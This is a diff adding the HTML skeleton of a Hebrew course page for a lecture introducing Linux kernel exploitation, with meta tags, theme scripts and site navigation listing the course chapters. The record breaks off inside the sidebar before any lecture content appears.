@@ -1,0 +1,2981 @@
+
+<!doctype html>
+<html lang="he" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="עד עכשיו כל מה שתקפנו רץ במרחב המשתמש - תוכניות רגילות, עם המחסנית שלהן, ה-heap שלהן וה-libc שלהן. הרווח הכי גדול שהשגנו היה shell עם ההרשאות של אותה...">
+      
+      
+        <meta name="author" content="עמית פנחסי">
+      
+      
+        <link rel="canonical" href="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/9%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%95%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%99%D7%9D/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/">
+      
+      
+        <link rel="prev" href="../../../8%20-%20%D7%94%D7%A0%D7%93%D7%A1%D7%94%20%D7%94%D7%A4%D7%95%D7%9B%D7%94%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C/8.8%20-%20%D7%A9%D7%99%D7%A8%D7%95%D7%AA%D7%99%20echo%20%D7%95heap%20%D7%9E%D7%A9%D7%95%D7%9C%D7%91/8.8%20-%20%D7%A9%D7%99%D7%A8%D7%95%D7%AA%D7%99%20echo%20%D7%95heap%20%D7%9E%D7%A9%D7%95%D7%9C%D7%91%20-%20%D7%AA%D7%A8%D7%92%D7%95%D7%9C/">
+      
+      
+        <link rel="next" href="../../9.2%20-%20syscall%20%D7%9E%D7%95%D7%AA%D7%90%D7%9D%20%D7%95ret2usr/9.2%20-%20syscall%20%D7%9E%D7%95%D7%AA%D7%90%D7%9D%20%D7%95ret2usr%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/">
+      
+      
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS הזנת" href="../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="הזנת RSS של תוכן מעודכן" href="../../../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../../../favicon.ico">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>9.1 - מבוא לניצול קרנל לינוקס - הרצאה - עמית טק</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Heebo:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Heebo";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../../../stylesheets/themes.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+  
+
+  <!-- Primary Meta Tags (name="description" is rendered by base.html from page.meta.description;
+       og:type/title/description/url and twitter:card/title/description are injected per-page by
+       the built-in social plugin - see material/plugins/social/templates/default.yml) -->
+  <meta name="author" content="עמית פנחסי">
+  <meta name="robots" content="index, follow">
+  <meta property="og:locale" content="he_IL">
+  <meta property="og:site_name" content="עמית טק">
+
+  
+  
+
+  <!-- Organization / WebSite structured data -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "Organization",
+        "@id": "https://amittech.dev/#organization",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "logo": "https://amittech.dev/amittech.png",
+        "founder": {
+          "@type": "Person",
+          "name": "עמית פנחסי"
+        },
+        "sameAs": ["https://discord.gg/ef5PQAAca2"]
+      },
+      {
+        "@type": "WebSite",
+        "@id": "https://amittech.dev/#website",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "description": "קורסי סייבר, תכנות, IT ומחשבים בחינם בעברית - מעל 2000 שעות לימוד עם תרגול מעשי. מתאים למתחילים ולמתקדמים.",
+        "inLanguage": "he",
+        "publisher": { "@id": "https://amittech.dev/#organization" }
+      },
+      {
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+          {
+            "@type": "ListItem",
+            "position": 1,
+            "name": "עמית טק",
+            "item": "https://amittech.dev/"
+          },
+          {
+            "@type": "ListItem",
+            "position": 2,
+            "name": "9.1 - \u05de\u05d1\u05d5\u05d0 \u05dc\u05e0\u05d9\u05e6\u05d5\u05dc \u05e7\u05e8\u05e0\u05dc \u05dc\u05d9\u05e0\u05d5\u05e7\u05e1 - \u05d4\u05e8\u05e6\u05d0\u05d4",
+            "item": "https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/9%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%95%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%99%D7%9D/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/"
+          }
+        ]
+      }
+    ]
+  }
+  </script>
+
+  <!-- Apply saved theme before first paint (prevents flash of default theme) -->
+  <script>
+    (function () {
+      /* Dark-based theme ids; everything else is treated as a light (default) scheme. */
+      var DARK = {
+        midnight: 1, dracula: 1, nord: 1, gruvbox: 1, "solarized-dark": 1,
+        matrix: 1, amber: 1, synthwave: 1, ocean: 1, emerald: 1, rose: 1, violet: 1
+      };
+      var id;
+      try { id = localStorage.getItem("am-theme"); } catch (e) { id = null; }
+      if (!id) id = "light";
+      var root = document.documentElement;
+      root.setAttribute("data-theme", id);
+      root.setAttribute("data-md-color-scheme", DARK[id] ? "slate" : "default");
+    })();
+  </script>
+
+  
+<meta property="og:type" content="website" />
+<meta property="og:title" content="9.1 - מבוא לניצול קרנל לינוקס - הרצאה - עמית טק" />
+<meta property="og:description" content="עד עכשיו כל מה שתקפנו רץ במרחב המשתמש - תוכניות רגילות, עם המחסנית שלהן, ה-heap שלהן וה-libc שלהן. הרווח הכי גדול שהשגנו היה shell עם ההרשאות של אותה..." />
+<meta property="og:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/9%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%95%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%99%D7%9D/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:url" content="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/9%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%95%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%99%D7%9D/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" />
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="9.1 - מבוא לניצול קרנל לינוקס - הרצאה - עמית טק" />
+<meta property="twitter:description" content="עד עכשיו כל מה שתקפנו רץ במרחב המשתמש - תוכניות רגילות, עם המחסנית שלהן, ה-heap שלהן וה-libc שלהן. הרווח הכי גדול שהשגנו היה shell עם ההרשאות של אותה..." />
+<meta property="twitter:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/9%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%95%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%99%D7%9D/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94.png" />
+</head>
+  
+  
+    <body dir="rtl">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#kernel-kernel-vs-userland" class="md-skip">
+          לדלג לתוכן
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="כותרת עליונה">
+    <a href="../../../.." title="עמית טק" class="md-header__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            עמית טק
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              9.1 - מבוא לניצול קרנל לינוקס - הרצאה
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="חיפוש" placeholder="חיפוש" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="חיפוש">
+        
+        <button type="reset" class="md-search__icon md-icon" title="ניקוי" aria-label="ניקוי" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            אתחול חיפוש
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="לשוניות" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  דף הבית
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  מי אני
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../blog/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  בלוג
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  תכנות
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  רשתות ומערכות הפעלה
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  אבטחת מידע וסייבר
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  מחקר ו-Low Level
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="ניווט" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="עמית טק" class="md-nav__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    עמית טק
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    דף הבית
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מי אני
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../blog/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    בלוג
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    רשתות ומערכות הפעלה
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    אבטחת מידע וסייבר
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר ו-Low Level
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר ו-Low Level
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ליבת המחשב
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר חולשות
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר חולשות
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../0%20-%20%D7%94%D7%A7%D7%93%D7%9E%D7%94%20%D7%95%D7%AA%D7%A9%D7%AA%D7%99%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    0   הקדמה ותשתית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../1%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%A4%D7%A9%D7%95%D7%98%D7%95%D7%AA%20%D7%95%D7%91%D7%90%D7%92%D7%99%D7%9D%20%D7%9C%D7%95%D7%92%D7%99%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1   חולשות פשוטות ובאגים לוגיים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../2%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20%D7%97%D7%95%D7%A6%D7%A5%20%D7%A2%D7%9C%20%D7%94%D7%9E%D7%97%D7%A1%D7%A0%D7%99%D7%AA/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2   גלישת חוצץ על המחסנית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
